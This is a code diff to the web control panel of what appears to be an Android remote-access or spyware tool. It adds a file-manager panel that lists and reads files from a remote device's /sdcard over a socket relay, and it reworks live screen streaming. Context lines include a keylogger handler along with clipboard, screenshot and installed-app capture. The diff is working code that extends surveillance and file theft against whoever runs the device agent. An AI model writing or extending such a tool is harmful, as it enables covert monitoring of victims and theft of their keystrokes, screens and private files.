@@ -124,6 +124,8 @@ select{background:var(--surface2);border:1px solid var(--border);color:var(--tex
   <button class="nav-btn" data-p="clipboard"><span class="ico">📋</span><span>Clipboard</span></button>
   <button class="nav-btn" data-p="apps"><span class="ico">📦</span><span>Apps</span></button>
 
+  <button class="nav-btn" data-p="files"><span class="ico">📁</span><span>Files</span></button>
+
   <div class="nav-lbl">⚙️ System</div>
   <button class="nav-btn" data-p="sysinfo"><span class="ico">📊</span><span>System Info</span></button>
   <button class="nav-btn" data-p="processes"><span class="ico">🔄</span><span>Processes</span></button>
@@ -252,6 +254,21 @@ select{background:var(--surface2);border:1px solid var(--border);color:var(--tex
   </div>
   <input class="ipt" id="apps-q" placeholder="Filter by app name or package...">
   <div class="data-list" id="apps-list"><div class="empty">Press Fetch Apps to load</div></div>
+</div>
+
+<!-- FILES -->
+<div class="panel" id="p-files">
+  <div class="ph"><h2>📁 File Manager</h2>
+    <span class="meta" id="files-path">/sdcard</span>
+    <button class="act-btn" id="files-up">⬆ Up</button>
+  </div>
+  <div class="data-list" id="files-list"><div class="empty">Loading...</div></div>
+  <div id="file-preview" style="display:none;flex-shrink:0">
+    <div class="ph" style="margin-top:8px"><h2 id="file-preview-name" style="font-size:.8rem"></h2>
+      <button class="act-btn" id="file-preview-close">✕ Close</button>
+    </div>
+    <pre id="file-preview-content" style="background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:12px;font-size:.75rem;overflow:auto;max-height:200px;white-space:pre-wrap;word-break:break-all"></pre>
+  </div>
 </div>
 
 <!-- SYSINFO -->
@@ -390,18 +407,30 @@ function connect(url) {
     toast("Screenshot received", "ok");
   });
 
-  // ── Live screen frames ────────────────────────────────────────
+  // ── Live screen frames ─────────────────────────────────────────
   const cvs = $("scr-canvas"), ctx = cvs.getContext("2d");
-  socket.on("screen_frame", d => {
-    if (!d || !d.data) return;
+  let _frameBusy = false;
+  // relay forwards android screen as "frame" event
+  socket.on("frame", d => {
+    if (!d || !d.data || _frameBusy) return;
+    // only handle frames from the selected agent
+    if (agent && d._agent && d._agent !== agent) return;
+    _frameBusy = true;
     $("scr-overlay").style.display = "none";
-    const img2 = new Image();
-    img2.onload = () => {
-      cvs.width = img2.width; cvs.height = img2.height;
-      ctx.drawImage(img2, 0, 0);
-    };
-    img2.src = "data:image/jpeg;base64," + d.data;
+    const blob = base64ToBlob(d.data, "image/jpeg");
+    createImageBitmap(blob).then(bmp => {
+      if (cvs.width !== bmp.width)  cvs.width  = bmp.width;
+      if (cvs.height !== bmp.height) cvs.height = bmp.height;
+      ctx.drawImage(bmp, 0, 0);
+      bmp.close();
+      _frameBusy = false;
+    }).catch(() => { _frameBusy = false; });
   });
+  function base64ToBlob(b64, mime) {
+    const bin = atob(b64), arr = new Uint8Array(bin.length);
+    for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
+    return new Blob([arr], { type: mime });
+  }
 
   // ── Keylogger chars ───────────────────────────────────────────
   socket.on("keylog_char", d => {
@@ -603,6 +632,61 @@ function renderSysinfo(d) {
     <div class="stat-card"><div class="stat-label">${esc(l)}</div><div class="stat-val" style="font-size:.9rem">${esc(String(v))}</div></div>
   `).join("");
   toast("System info received", "ok");
+}
+
+// ── File Manager ─────────────────────────────────────────────────
+let _curPath = "";
+function browseDir(path) {
+  _curPath = path || "";
+  $("files-path").textContent = _curPath || "/sdcard";
+  emit("list_dir", { path: _curPath });
+}
+function browseUp() {
+  if (!_curPath) return;
+  const parts = _curPath.split("/").filter(Boolean);
+  parts.pop();
+  browseDir(parts.length ? "/" + parts.join("/") : "");
+}
+socket.on("dir_result", d => {
+  if (!d) return;
+  _curPath = d.path || _curPath;
+  $("files-path").textContent = _curPath;
+  const list = $("files-list");
+  const entries = d.entries || [];
+  if (!entries.length) { list.innerHTML = '<div class="empty">Empty folder</div>'; return; }
+  entries.sort((a, b) => (b.is_dir - a.is_dir) || a.name.localeCompare(b.name));
+  list.innerHTML = entries.map(e => `<div class="row" style="cursor:pointer;display:flex;align-items:center;gap:8px"
+    data-path="${esc(e.path)}" data-dir="${e.is_dir ? 1 : 0}">
+    <span style="font-size:1.1rem">${e.is_dir ? "📁" : "📄"}</span>
+    <div><div class="r-title">${esc(e.name)}</div>
+    <div class="r-sub">${e.is_dir ? "Folder" : fmtSize(e.size)}</div></div>
+  </div>`).join("");
+  list.querySelectorAll(".row").forEach(r => {
+    r.addEventListener("click", () => {
+      if (r.dataset.dir === "1") browseDir(r.dataset.path);
+      else { emit("read_file", { path: r.dataset.path }); $("file-preview-name").textContent = r.dataset.path.split("/").pop(); }
+    });
+  });
+});
+socket.on("file_data", d => {
+  if (!d || !d.data) { toast("Cannot read file — permission denied", "err"); return; }
+  try {
+    const bytes = atob(d.data);
+    let text = "";
+    for (let i = 0; i < Math.min(bytes.length, 8192); i++) text += String.fromCharCode(bytes.charCodeAt(i));
+    $("file-preview-content").textContent = text;
+    $("file-preview").style.display = "";
+  } catch(e) { toast("Binary file — cannot display as text", "err"); }
+});
+document.querySelector('.nav-btn[data-p="files"]').addEventListener("click", () => {
+  if (!_curPath) browseDir("");
+});
+$("files-up").addEventListener("click", browseUp);
+$("file-preview-close").addEventListener("click", () => { $("file-preview").style.display = "none"; });
+function fmtSize(b) {
+  if (b < 1024) return b + " B";
+  if (b < 1048576) return (b/1024).toFixed(1) + " KB";
+  return (b/1048576).toFixed(1) + " MB";
 }
 
 function renderProcesses(list) {
